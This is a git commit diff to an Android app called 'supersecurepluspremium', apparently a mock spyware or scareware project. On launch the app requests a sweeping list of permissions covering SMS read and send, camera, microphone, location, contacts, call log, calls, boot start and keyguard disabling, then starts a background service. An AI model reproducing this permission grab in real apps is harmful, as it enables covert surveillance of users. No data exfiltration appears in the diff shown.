553254c37cef35c735dc981c03bb2856163971fb
glamorous-noob <glamorous_noob@protonmail.com>
2020-04-08 18:39:27 +0200

    Demande des permissions en runtime

--- app/src/main/java/com/example/supersecurepluspremium/MainActivity.java
+++ app/src/main/java/com/example/supersecurepluspremium/MainActivity.java
@@ -1,29 +1,52 @@
 package com.example.supersecurepluspremium;
 
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
-import android.annotation.SuppressLint;
+import android.Manifest;
 import android.app.KeyguardManager;
-import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.os.Handler;
-import android.provider.Settings;
 import android.util.Log;
-import android.view.MotionEvent;
 import android.view.View;
 import android.widget.ImageView;
 import android.widget.TextView;
 
 import com.bumptech.glide.Glide;
 
-import java.util.Timer;
-import java.util.TimerTask;
-
 public class MainActivity extends AppCompatActivity {
+    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 666;
     private static int LOAD_TIME = 2000;
     private static boolean authenticated = false;
     private static boolean scanning = false;
+    private static String[] neededPermissions = {
+        Manifest.permission.DISABLE_KEYGUARD,
+            Manifest.permission.INTERNET,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.CAMERA,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.WRITE_CONTACTS,
+            Manifest.permission.WRITE_SETTINGS,
+            Manifest.permission.ACCESS_WIFI_STATE,
+            Manifest.permission.CHANGE_WIFI_STATE,
+            Manifest.permission.RECEIVE_BOOT_COMPLETED,
+            Manifest.permission.SET_WALLPAPER,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.WRITE_CALL_LOG,
+            Manifest.permission.WAKE_LOCK
+    };
 
     private static int ACTIVITY_LOCK = 4;
     private static int ACTIVITY_FIRST_LOAD = 3;
@@ -88,11 +111,31 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    protected void checkPermissions(){
+        /*
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+
+            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {
+
+            } else {
+                ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);
+            }
+        } else {
+
+        }
+
+         */
+
+        ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);
+
+    }
+
     //Démarrage de l'application
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        checkPermissions();
         ImageView imageView = findViewById(R.id.imageView);
         Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
         startService(new Intent(this, MyIntentService.class));
